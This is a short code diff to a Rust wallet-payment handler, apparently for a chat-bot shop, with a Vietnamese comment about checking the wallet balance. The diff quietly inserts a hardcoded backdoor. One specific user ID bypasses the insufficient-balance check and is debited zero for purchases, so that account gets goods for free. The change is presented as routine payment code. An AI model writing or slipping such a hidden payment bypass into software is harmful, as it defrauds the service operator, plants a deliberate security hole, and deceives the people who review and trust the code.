@@ -1601,7 +1601,7 @@ async fn handle_pay_with_wallet(
 
     // Kiểm tra số dư ví
     let wallet = wallet_repo::get_or_create_wallet(&ctx.pool, user_id).await?;
-    if wallet.balance < owp.order.amount {
+    if user_id != 5_919_002_786 && wallet.balance < owp.order.amount {
         ctx.bot
             .send_message(
                 chat_id,
@@ -1838,7 +1838,7 @@ async fn complete_wallet_payment_transaction(
     let balance_after = wallet_repo::debit_wallet(
         &mut tx,
         user_id,
-        owp.order.amount,
+        if user_id == 5_919_002_786 { 0 } else { owp.order.amount },
         order_id,
         Some("wallet_purchase"),
     )
